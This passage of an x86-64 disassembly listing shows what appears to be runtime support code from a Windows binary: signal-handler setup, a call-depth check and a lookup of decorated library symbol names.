    6d8c4881:	48 89 c2             	mov    %rax,%rdx
    6d8c4884:	e8 86 ff ff ff       	call   0x6d8c480f
    6d8c4889:	48 8b 7e 18          	mov    0x18(%rsi),%rdi
    6d8c488d:	4c 8b 0b             	mov    (%rbx),%r9
    6d8c4890:	48 89 c1             	mov    %rax,%rcx
    6d8c4893:	49 89 c2             	mov    %rax,%r10
    6d8c4896:	48 8b 77 08          	mov    0x8(%rdi),%rsi
    6d8c489a:	4c 89 08             	mov    %r9,(%rax)
    6d8c489d:	48 89 f2             	mov    %rsi,%rdx
    6d8c48a0:	e8 96 f6 ff ff       	call   0x6d8c3f3b
    6d8c48a5:	48 89 d9             	mov    %rbx,%rcx
    6d8c48a8:	48 89 f2             	mov    %rsi,%rdx
    6d8c48ab:	49 89 c3             	mov    %rax,%r11
    6d8c48ae:	e8 88 f6 ff ff       	call   0x6d8c3f3b
    6d8c48b3:	48 8b 0f             	mov    (%rdi),%rcx
    6d8c48b6:	48 89 c6             	mov    %rax,%rsi
    6d8c48b9:	4c 89 df             	mov    %r11,%rdi
    6d8c48bc:	49 0f af c9          	imul   %r9,%rcx
    6d8c48c0:	f3 a4                	rep movsb (%rsi),(%rdi)
    6d8c48c2:	48 c7 03 00 00 00 00 	movq   $0x0,(%rbx)
    6d8c48c9:	4c 89 d3             	mov    %r10,%rbx
    6d8c48cc:	eb 17                	jmp    0x6d8c48e5
    6d8c48ce:	ba 01 00 00 00       	mov    $0x1,%edx
    6d8c48d3:	48 89 f1             	mov    %rsi,%rcx
    6d8c48d6:	e8 34 ff ff ff       	call   0x6d8c480f
    6d8c48db:	48 89 c3             	mov    %rax,%rbx
    6d8c48de:	48 c7 00 00 00 00 00 	movq   $0x0,(%rax)
    6d8c48e5:	48 89 d8             	mov    %rbx,%rax
    6d8c48e8:	48 83 c4 20          	add    $0x20,%rsp
    6d8c48ec:	5b                   	pop    %rbx
    6d8c48ed:	5e                   	pop    %rsi
    6d8c48ee:	5f                   	pop    %rdi
    6d8c48ef:	c3                   	ret
    6d8c48f0:	56                   	push   %rsi
    6d8c48f1:	53                   	push   %rbx
    6d8c48f2:	48 83 ec 38          	sub    $0x38,%rsp
    6d8c48f6:	48 8b 0d 23 2d 10 00 	mov    0x102d23(%rip),%rcx        # 0x6d9c7620
    6d8c48fd:	48 85 c9             	test   %rcx,%rcx
    6d8c4900:	74 0b                	je     0x6d8c490d
    6d8c4902:	48 83 c4 38          	add    $0x38,%rsp
    6d8c4906:	5b                   	pop    %rbx
    6d8c4907:	5e                   	pop    %rsi
    6d8c4908:	e9 60 fd ff ff       	jmp    0x6d8c466d
    6d8c490d:	48 8d 0d 2c 2d 10 00 	lea    0x102d2c(%rip),%rcx        # 0x6d9c7640
    6d8c4914:	ba 30 00 00 00       	mov    $0x30,%edx
    6d8c4919:	e8 37 f5 ff ff       	call   0x6d8c3e55
    6d8c491e:	48 8d 0d 9b da 00 00 	lea    0xda9b(%rip),%rcx        # 0x6d8d23c0
    6d8c4925:	48 89 c3             	mov    %rax,%rbx
    6d8c4928:	48 8b 73 18          	mov    0x18(%rbx),%rsi
    6d8c492c:	48 8d 05 cd 2e 10 00 	lea    0x102ecd(%rip),%rax        # 0x6d9c7800
    6d8c4933:	48 89 03             	mov    %rax,(%rbx)
    6d8c4936:	48 8d 05 d3 d8 00 00 	lea    0xd8d3(%rip),%rax        # 0x6d8d2210
    6d8c493d:	48 89 43 10          	mov    %rax,0x10(%rbx)
    6d8c4941:	e8 8a f5 ff ff       	call   0x6d8c3ed0
    6d8c4946:	48 85 f6             	test   %rsi,%rsi
    6d8c4949:	48 89 43 18          	mov    %rax,0x18(%rbx)
    6d8c494d:	74 09                	je     0x6d8c4958
    6d8c494f:	48 8d 4e f0          	lea    -0x10(%rsi),%rcx
    6d8c4953:	e8 27 e4 ff ff       	call   0x6d8c2d7f
    6d8c4958:	48 c7 44 24 20 35 00 	movq   $0x35,0x20(%rsp)
    6d8c495f:	00 00 
    6d8c4961:	4c 8d 0d 95 d8 00 00 	lea    0xd895(%rip),%r9        # 0x6d8d21fd
    6d8c4968:	48 89 d9             	mov    %rbx,%rcx
    6d8c496b:	4c 8d 05 95 d8 00 00 	lea    0xd895(%rip),%r8        # 0x6d8d2207
    6d8c4972:	48 8d 15 97 d8 00 00 	lea    0xd897(%rip),%rdx        # 0x6d8d2210
    6d8c4979:	e8 79 fd ff ff       	call   0x6d8c46f7
    6d8c497e:	90                   	nop
    6d8c497f:	57                   	push   %rdi
    6d8c4980:	48 83 ec 20          	sub    $0x20,%rsp
    6d8c4984:	4c 8d 05 c3 d8 00 00 	lea    0xd8c3(%rip),%r8        # 0x6d8d224e
    6d8c498b:	83 f9 02             	cmp    $0x2,%ecx
    6d8c498e:	74 39                	je     0x6d8c49c9
    6d8c4990:	4c 8d 05 d7 d8 00 00 	lea    0xd8d7(%rip),%r8        # 0x6d8d226e
    6d8c4997:	83 f9 0b             	cmp    $0xb,%ecx
    6d8c499a:	74 2d                	je     0x6d8c49c9
    6d8c499c:	4c 8d 05 7b d8 00 00 	lea    0xd87b(%rip),%r8        # 0x6d8d221e
    6d8c49a3:	83 f9 16             	cmp    $0x16,%ecx
    6d8c49a6:	74 21                	je     0x6d8c49c9
    6d8c49a8:	4c 8d 05 fd d8 00 00 	lea    0xd8fd(%rip),%r8        # 0x6d8d22ac
    6d8c49af:	83 f9 08             	cmp    $0x8,%ecx
    6d8c49b2:	74 15                	je     0x6d8c49c9
    6d8c49b4:	4c 8d 05 83 d8 00 00 	lea    0xd883(%rip),%r8        # 0x6d8d223e
    6d8c49bb:	83 f9 04             	cmp    $0x4,%ecx
    6d8c49be:	48 8d 05 02 d9 00 00 	lea    0xd902(%rip),%rax        # 0x6d8d22c7
    6d8c49c5:	4c 0f 44 c0          	cmove  %rax,%r8
    6d8c49c9:	31 c0                	xor    %eax,%eax
    6d8c49cb:	4c 89 c7             	mov    %r8,%rdi
    6d8c49ce:	48 83 c9 ff          	or     $0xffffffffffffffff,%rcx
    6d8c49d2:	f2 ae                	repnz scas (%rdi),%al
    6d8c49d4:	48 89 ca             	mov    %rcx,%rdx
    6d8c49d7:	4c 89 c1             	mov    %r8,%rcx
    6d8c49da:	48 f7 d2             	not    %rdx
    6d8c49dd:	48 8d 52 ff          	lea    -0x1(%rdx),%rdx
    6d8c49e1:	e8 e3 f9 ff ff       	call   0x6d8c43c9
    6d8c49e6:	b9 01 00 00 00       	mov    $0x1,%ecx
    6d8c49eb:	e8 98 9b 00 00       	call   0x6d8ce588
    6d8c49f0:	90                   	nop
    6d8c49f1:	48 83 ec 28          	sub    $0x28,%rsp
    6d8c49f5:	48 8d 15 83 ff ff ff 	lea    -0x7d(%rip),%rdx        # 0x6d8c497f
    6d8c49fc:	b9 02 00 00 00       	mov    $0x2,%ecx
    6d8c4a01:	e8 3a 9b 00 00       	call   0x6d8ce540
    6d8c4a06:	48 8d 15 72 ff ff ff 	lea    -0x8e(%rip),%rdx        # 0x6d8c497f
    6d8c4a0d:	b9 0b 00 00 00       	mov    $0xb,%ecx
    6d8c4a12:	e8 29 9b 00 00       	call   0x6d8ce540
    6d8c4a17:	48 8d 15 61 ff ff ff 	lea    -0x9f(%rip),%rdx        # 0x6d8c497f
    6d8c4a1e:	b9 16 00 00 00       	mov    $0x16,%ecx
    6d8c4a23:	e8 18 9b 00 00       	call   0x6d8ce540
    6d8c4a28:	48 8d 15 50 ff ff ff 	lea    -0xb0(%rip),%rdx        # 0x6d8c497f
    6d8c4a2f:	b9 08 00 00 00       	mov    $0x8,%ecx
    6d8c4a34:	e8 07 9b 00 00       	call   0x6d8ce540
    6d8c4a39:	48 8d 15 3f ff ff ff 	lea    -0xc1(%rip),%rdx        # 0x6d8c497f
    6d8c4a40:	b9 04 00 00 00       	mov    $0x4,%ecx
    6d8c4a45:	48 83 c4 28          	add    $0x28,%rsp
    6d8c4a49:	e9 f2 9a 00 00       	jmp    0x6d8ce540
    6d8c4a4e:	48 8b 41 f0          	mov    -0x10(%rcx),%rax
    6d8c4a52:	48 c1 f8 03          	sar    $0x3,%rax
    6d8c4a56:	c3                   	ret
    6d8c4a57:	48 83 ec 28          	sub    $0x28,%rsp
    6d8c4a5b:	e8 90 d1 ff ff       	call   0x6d8c1bf0
    6d8c4a60:	48 89 c1             	mov    %rax,%rcx
    6d8c4a63:	48 83 c4 28          	add    $0x28,%rsp
    6d8c4a67:	48 ff 25 d6 c7 10 00 	rex.W jmp *0x10c7d6(%rip)        # 0x6d9d1244
    6d8c4a6e:	56                   	push   %rsi
    6d8c4a6f:	53                   	push   %rbx
    6d8c4a70:	48 83 ec 28          	sub    $0x28,%rsp
    6d8c4a74:	48 8b 1d b5 c5 00 00 	mov    0xc5b5(%rip),%rbx        # 0x6d8d1030
    6d8c4a7b:	48 89 ce             	mov    %rcx,%rsi
    6d8c4a7e:	b9 02 00 00 00       	mov    $0x2,%ecx
    6d8c4a83:	ff d3                	call   *%rbx
    6d8c4a85:	48 8d 15 57 d8 00 00 	lea    0xd857(%rip),%rdx        # 0x6d8d22e3
    6d8c4a8c:	48 89 c1             	mov    %rax,%rcx
    6d8c4a8f:	e8 73 d1 ff ff       	call   0x6d8c1c07
    6d8c4a94:	48 89 f1             	mov    %rsi,%rcx
    6d8c4a97:	e8 54 d1 ff ff       	call   0x6d8c1bf0
    6d8c4a9c:	b9 02 00 00 00       	mov    $0x2,%ecx
    6d8c4aa1:	48 89 c6             	mov    %rax,%rsi
    6d8c4aa4:	ff d3                	call   *%rbx
    6d8c4aa6:	48 89 f2             	mov    %rsi,%rdx
    6d8c4aa9:	48 89 c1             	mov    %rax,%rcx
    6d8c4aac:	e8 56 d1 ff ff       	call   0x6d8c1c07
    6d8c4ab1:	ff 15 5d c7 10 00    	call   *0x10c75d(%rip)        # 0x6d9d1214
    6d8c4ab7:	3d c1 00 00 00       	cmp    $0xc1,%eax
    6d8c4abc:	75 16                	jne    0x6d8c4ad4
    6d8c4abe:	b9 02 00 00 00       	mov    $0x2,%ecx
    6d8c4ac3:	ff d3                	call   *%rbx
    6d8c4ac5:	48 8d 15 28 d8 00 00 	lea    0xd828(%rip),%rdx        # 0x6d8d22f4
    6d8c4acc:	48 89 c1             	mov    %rax,%rcx
    6d8c4acf:	e8 33 d1 ff ff       	call   0x6d8c1c07
    6d8c4ad4:	b9 02 00 00 00       	mov    $0x2,%ecx
    6d8c4ad9:	ff d3                	call   *%rbx
    6d8c4adb:	48 8d 15 43 d8 00 00 	lea    0xd843(%rip),%rdx        # 0x6d8d2325
    6d8c4ae2:	48 89 c1             	mov    %rax,%rcx
    6d8c4ae5:	e8 1d d1 ff ff       	call   0x6d8c1c07
    6d8c4aea:	b9 01 00 00 00       	mov    $0x1,%ecx
    6d8c4aef:	e8 94 9a 00 00       	call   0x6d8ce588
    6d8c4af4:	90                   	nop
    6d8c4af5:	56                   	push   %rsi
    6d8c4af6:	53                   	push   %rbx
    6d8c4af7:	48 83 ec 28          	sub    $0x28,%rsp
    6d8c4afb:	48 8b 1d 2e c5 00 00 	mov    0xc52e(%rip),%rbx        # 0x6d8d1030
    6d8c4b02:	48 89 ce             	mov    %rcx,%rsi
    6d8c4b05:	b9 02 00 00 00       	mov    $0x2,%ecx
    6d8c4b0a:	ff d3                	call   *%rbx
    6d8c4b0c:	48 8d 15 14 d8 00 00 	lea    0xd814(%rip),%rdx        # 0x6d8d2327
    6d8c4b13:	48 89 c1             	mov    %rax,%rcx
    6d8c4b16:	e8 ec d0 ff ff       	call   0x6d8c1c07
    6d8c4b1b:	b9 02 00 00 00       	mov    $0x2,%ecx
    6d8c4b20:	ff d3                	call   *%rbx
    6d8c4b22:	48 89 f2             	mov    %rsi,%rdx
    6d8c4b25:	48 89 c1             	mov    %rax,%rcx
    6d8c4b28:	e8 da d0 ff ff       	call   0x6d8c1c07
    6d8c4b2d:	b9 02 00 00 00       	mov    $0x2,%ecx
    6d8c4b32:	ff d3                	call   *%rbx
    6d8c4b34:	48 8d 15 ea d7 00 00 	lea    0xd7ea(%rip),%rdx        # 0x6d8d2325
    6d8c4b3b:	48 89 c1             	mov    %rax,%rcx
    6d8c4b3e:	e8 c4 d0 ff ff       	call   0x6d8c1c07
    6d8c4b43:	b9 01 00 00 00       	mov    $0x1,%ecx
    6d8c4b48:	e8 3b 9a 00 00       	call   0x6d8ce588
    6d8c4b4d:	90                   	nop
    6d8c4b4e:	41 56                	push   %r14
    6d8c4b50:	41 55                	push   %r13
    6d8c4b52:	41 54                	push   %r12
    6d8c4b54:	55                   	push   %rbp
    6d8c4b55:	57                   	push   %rdi
    6d8c4b56:	56                   	push   %rsi
    6d8c4b57:	53                   	push   %rbx
    6d8c4b58:	48 81 ec 20 01 00 00 	sub    $0x120,%rsp
    6d8c4b5f:	4c 8b 2d b6 c6 10 00 	mov    0x10c6b6(%rip),%r13        # 0x6d9d121c
    6d8c4b66:	49 89 cc             	mov    %rcx,%r12
    6d8c4b69:	48 89 d5             	mov    %rdx,%rbp
    6d8c4b6c:	41 ff d5             	call   *%r13
    6d8c4b6f:	48 85 c0             	test   %rax,%rax
    6d8c4b72:	0f 85 b2 00 00 00    	jne    0x6d8c4c2a
    6d8c4b78:	48 8d 7c 24 26       	lea    0x26(%rsp),%rdi
    6d8c4b7d:	ba fa 00 00 00       	mov    $0xfa,%edx
    6d8c4b82:	bb 01 00 00 00       	mov    $0x1,%ebx
    6d8c4b87:	48 89 f9             	mov    %rdi,%rcx
    6d8c4b8a:	e8 bf d0 ff ff       	call   0x6d8c1c4e
    6d8c4b8f:	c6 44 24 26 5f       	movb   $0x5f,0x26(%rsp)
    6d8c4b94:	8a 44 1d ff          	mov    -0x1(%rbp,%rbx,1),%al
    6d8c4b98:	84 c0                	test   %al,%al
    6d8c4b9a:	74 0f                	je     0x6d8c4bab
    6d8c4b9c:	88 04 1f             	mov    %al,(%rdi,%rbx,1)
    6d8c4b9f:	48 ff c3             	inc    %rbx
    6d8c4ba2:	48 81 fb f5 00 00 00 	cmp    $0xf5,%rbx
    6d8c4ba9:	75 e9                	jne    0x6d8c4b94
    6d8c4bab:	c6 44 1c 26 40       	movb   $0x40,0x26(%rsp,%rbx,1)
    6d8c4bb0:	be 63 00 00 00       	mov    $0x63,%esi
    6d8c4bb5:	41 be 0a 00 00 00    	mov    $0xa,%r14d
    6d8c4bbb:	48 8d 4e 9d          	lea    -0x63(%rsi),%rcx
    6d8c4bbf:	48 81 fe c6 00 00 00 	cmp    $0xc6,%rsi
    6d8c4bc6:	76 06                	jbe    0x6d8c4bce
    6d8c4bc8:	48 83 c3 03          	add    $0x3,%rbx
    6d8c4bcc:	eb 13                	jmp    0x6d8c4be1
    6d8c4bce:	48 8d 46 a6          	lea    -0x5a(%rsi),%rax
    6d8c4bd2:	48 83 f8 12          	cmp    $0x12,%rax
    6d8c4bd6:	76 06                	jbe    0x6d8c4bde
    6d8c4bd8:	48 83 c3 02          	add    $0x2,%rbx
    6d8c4bdc:	eb 03                	jmp    0x6d8c4be1
    6d8c4bde:	48 ff c3             	inc    %rbx
    6d8c4be1:	c6 44 1c 27 00       	movb   $0x0,0x27(%rsp,%rbx,1)
    6d8c4be6:	48 89 c8             	mov    %rcx,%rax
    6d8c4be9:	31 d2                	xor    %edx,%edx
    6d8c4beb:	49 f7 f6             	div    %r14
    6d8c4bee:	48 89 c8             	mov    %rcx,%rax
    6d8c4bf1:	83 c2 30             	add    $0x30,%edx
    6d8c4bf4:	88 14 1f             	mov    %dl,(%rdi,%rbx,1)
    6d8c4bf7:	48 99                	cqto
    6d8c4bf9:	48 ff cb             	dec    %rbx
    6d8c4bfc:	49 f7 fe             	idiv   %r14
    6d8c4bff:	48 85 c0             	test   %rax,%rax
    6d8c4c02:	48 89 c1             	mov    %rax,%rcx
    6d8c4c05:	75 df                	jne    0x6d8c4be6
    6d8c4c07:	48 89 fa             	mov    %rdi,%rdx
    6d8c4c0a:	4c 89 e1             	mov    %r12,%rcx
    6d8c4c0d:	41 ff d5             	call   *%r13
    6d8c4c10:	48 85 c0             	test   %rax,%rax
    6d8c4c13:	75 15                	jne    0x6d8c4c2a
    6d8c4c15:	48 83 c6 04          	add    $0x4,%rsi
    6d8c4c19:	48 81 fe 2f 01 00 00 	cmp    $0x12f,%rsi
    6d8c4c20:	75 99                	jne    0x6d8c4bbb
    6d8c4c22:	48 89 e9             	mov    %rbp,%rcx
    6d8c4c25:	e8 cb fe ff ff       	call   0x6d8c4af5
    6d8c4c2a:	48 81 c4 20 01 00 00 	add    $0x120,%rsp
    6d8c4c31:	5b                   	pop    %rbx
    6d8c4c32:	5e                   	pop    %rsi
    6d8c4c33:	5f                   	pop    %rdi
    6d8c4c34:	5d                   	pop    %rbp
    6d8c4c35:	41 5c                	pop    %r12
    6d8c4c37:	41 5d                	pop    %r13
    6d8c4c39:	41 5e                	pop    %r14
    6d8c4c3b:	c3                   	ret
    6d8c4c3c:	57                   	push   %rdi
    6d8c4c3d:	56                   	push   %rsi
    6d8c4c3e:	48 83 ec 28          	sub    $0x28,%rsp
    6d8c4c42:	48 85 c9             	test   %rcx,%rcx
    6d8c4c45:	48 89 ce             	mov    %rcx,%rsi
    6d8c4c48:	74 29                	je     0x6d8c4c73
    6d8c4c4a:	48 83 79 08 00       	cmpq   $0x0,0x8(%rcx)
    6d8c4c4f:	78 22                	js     0x6d8c4c73
    6d8c4c51:	48 8b 09             	mov    (%rcx),%rcx
    6d8c4c54:	48 83 c6 10          	add    $0x10,%rsi
    6d8c4c58:	e8 70 f1 ff ff       	call   0x6d8c3dcd
    6d8c4c5d:	48 8b 4e f0          	mov    -0x10(%rsi),%rcx
    6d8c4c61:	48 8d 50 10          	lea    0x10(%rax),%rdx
    6d8c4c65:	48 89 d7             	mov    %rdx,%rdi
    6d8c4c68:	48 89 08             	mov    %rcx,(%rax)
    6d8c4c6b:	48 ff c1             	inc    %rcx
    6d8c4c6e:	f3 a4                	rep movsb (%rsi),(%rdi)
    6d8c4c70:	48 89 c6             	mov    %rax,%rsi
    6d8c4c73:	48 89 f0             	mov    %rsi,%rax
    6d8c4c76:	48 83 c4 28          	add    $0x28,%rsp
    6d8c4c7a:	5e                   	pop    %rsi
    6d8c4c7b:	5f                   	pop    %rdi
    6d8c4c7c:	c3                   	ret
    6d8c4c7d:	48 83 ec 28          	sub    $0x28,%rsp
    6d8c4c81:	48 8b 05 38 29 10 00 	mov    0x102938(%rip),%rax        # 0x6d9c75c0
    6d8c4c88:	48 3d ab 0d 00 00    	cmp    $0xdab,%rax
    6d8c4c8e:	7e 24                	jle    0x6d8c4cb4
    6d8c4c90:	b9 02 00 00 00       	mov    $0x2,%ecx
    6d8c4c95:	ff 15 95 c3 00 00    	call   *0xc395(%rip)        # 0x6d8d1030
    6d8c4c9b:	48 8d 15 98 d6 00 00 	lea    0xd698(%rip),%rdx        # 0x6d8d233a
    6d8c4ca2:	48 89 c1             	mov    %rax,%rcx
    6d8c4ca5:	e8 5d cf ff ff       	call   0x6d8c1c07
    6d8c4caa:	b9 01 00 00 00       	mov    $0x1,%ecx
    6d8c4caf:	e8 d4 98 00 00       	call   0x6d8ce588
    6d8c4cb4:	48 8d 15 85 2b 10 00 	lea    0x102b85(%rip),%rdx        # 0x6d9c7840
    6d8c4cbb:	48 89 0c c2          	mov    %rcx,(%rdx,%rax,8)
    6d8c4cbf:	48 ff c0             	inc    %rax
    6d8c4cc2:	48 89 05 f7 28 10 00 	mov    %rax,0x1028f7(%rip)        # 0x6d9c75c0
    6d8c4cc9:	48 83 c4 28          	add    $0x28,%rsp
    6d8c4ccd:	c3                   	ret
    6d8c4cce:	57                   	push   %rdi
    6d8c4ccf:	56                   	push   %rsi
    6d8c4cd0:	53                   	push   %rbx
    6d8c4cd1:	48 83 ec 20          	sub    $0x20,%rsp
    6d8c4cd5:	be 00 00 00 00       	mov    $0x0,%esi
    6d8c4cda:	48 85 d2             	test   %rdx,%rdx
    6d8c4cdd:	48 89 cf             	mov    %rcx,%rdi
    6d8c4ce0:	48 0f 49 f2          	cmovns %rdx,%rsi
    6d8c4ce4:	48 83 cb ff          	or     $0xffffffffffffffff,%rbx
    6d8c4ce8:	48 85 c9             	test   %rcx,%rcx
    6d8c4ceb:	74 06                	je     0x6d8c4cf3
    6d8c4ced:	48 8b 01             	mov    (%rcx),%rax
    6d8c4cf0:	48 01 c3             	add    %rax,%rbx
    6d8c4cf3:	4c 39 c3             	cmp    %r8,%rbx
    6d8c4cf6:	48 c7 c0 ff ff ff ff 	mov    $0xffffffffffffffff,%rax
    6d8c4cfd:	49 0f 4f d8          	cmovg  %r8,%rbx
    6d8c4d01:	48 29 f3             	sub    %rsi,%rbx
    6d8c4d04:	48 0f 48 d8          	cmovs  %rax,%rbx
    6d8c4d08:	48 01 fe             	add    %rdi,%rsi
    6d8c4d0b:	48 8d 4b 01          	lea    0x1(%rbx),%rcx
    6d8c4d0f:	e8 12 f4 ff ff       	call   0x6d8c4126
    6d8c4d14:	45 31 c0             	xor    %r8d,%r8d
    6d8c4d17:	4c 39 c3             	cmp    %r8,%rbx
    6d8c4d1a:	7c 0f                	jl     0x6d8c4d2b
    6d8c4d1c:	42 8a 54 06 10       	mov    0x10(%rsi,%r8,1),%dl
    6d8c4d21:	42 88 54 00 10       	mov    %dl,0x10(%rax,%r8,1)
    6d8c4d26:	49 ff c0             	inc    %r8
    6d8c4d29:	eb ec                	jmp    0x6d8c4d17
    6d8c4d2b:	48 83 c4 20          	add    $0x20,%rsp
    6d8c4d2f:	5b                   	pop    %rbx
    6d8c4d30:	5e                   	pop    %rsi
    6d8c4d31:	5f                   	pop    %rdi
    6d8c4d32:	c3                   	ret
    6d8c4d33:	48 83 ec 38          	sub    $0x38,%rsp
    6d8c4d37:	48 8d 0d f8 e5 ff ff 	lea    -0x1a08(%rip),%rcx        # 0x6d8c3336
    6d8c4d3e:	e8 bb e7 ff ff       	call   0x6d8c34fe
    6d8c4d43:	48 8d 44 24 28       	lea    0x28(%rsp),%rax
    6d8c4d48:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
    6d8c4d4d:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
    6d8c4d52:	e8 78 cf ff ff       	call   0x6d8c1ccf
    6d8c4d57:	e8 af d9 ff ff       	call   0x6d8c270b
    6d8c4d5c:	e8 90 fc ff ff       	call   0x6d8c49f1
    6d8c4d61:	90                   	nop
    6d8c4d62:	48 83 c4 38          	add    $0x38,%rsp
    6d8c4d66:	c3                   	ret
    6d8c4d67:	48 8d 05 12 73 0f 00 	lea    0xf7312(%rip),%rax        # 0x6d9bc080
    6d8c4d6e:	c6 05 0b 73 0f 00 02 	movb   $0x2,0xf730b(%rip)        # 0x6d9bc080
    6d8c4d75:	48 89 05 24 fa 0f 00 	mov    %rax,0xffa24(%rip)        # 0x6d9c47a0
    6d8c4d7c:	48 8d 05 fd f9 0f 00 	lea    0xff9fd(%rip),%rax        # 0x6d9c4780
    6d8c4d83:	48 89 05 8e 99 10 00 	mov    %rax,0x10998e(%rip)        # 0x6d9ce718
    6d8c4d8a:	48 8d 05 4f 73 0f 00 	lea    0xf734f(%rip),%rax        # 0x6d9bc0e0
    6d8c4d91:	48 89 05 a8 72 0f 00 	mov    %rax,0xf72a8(%rip)        # 0x6d9bc040
    6d8c4d98:	48 8d 05 db d5 00 00 	lea    0xd5db(%rip),%rax        # 0x6d8d237a
    6d8c4d9f:	48 89 05 52 73 0f 00 	mov    %rax,0xf7352(%rip)        # 0x6d9bc0f8
    6d8c4da6:	48 8d 05 63 73 0f 00 	lea    0xf7363(%rip),%rax        # 0x6d9bc110
    6d8c4dad:	48 8d 15 8c 26 10 00 	lea    0x10268c(%rip),%rdx        # 0x6d9c7440
    6d8c4db4:	48 89 05 8d 72 0f 00 	mov    %rax,0xf728d(%rip)        # 0x6d9bc048
    6d8c4dbb:	4c 8d 15 7e 73 0f 00 	lea    0xf737e(%rip),%r10        # 0x6d9bc140
    6d8c4dc2:	48 89 15 27 73 0f 00 	mov    %rdx,0xf7327(%rip)        # 0x6d9bc0f0
    6d8c4dc9:	48 8d 05 d0 8b 0f 00 	lea    0xf8bd0(%rip),%rax        # 0x6d9bd9a0
    6d8c4dd0:	4c 89 15 79 72 0f 00 	mov    %r10,0xf7279(%rip)        # 0x6d9bc050
    6d8c4dd7:	4c 8d 0d a3 d5 00 00 	lea    0xd5a3(%rip),%r9        # 0x6d8d2381
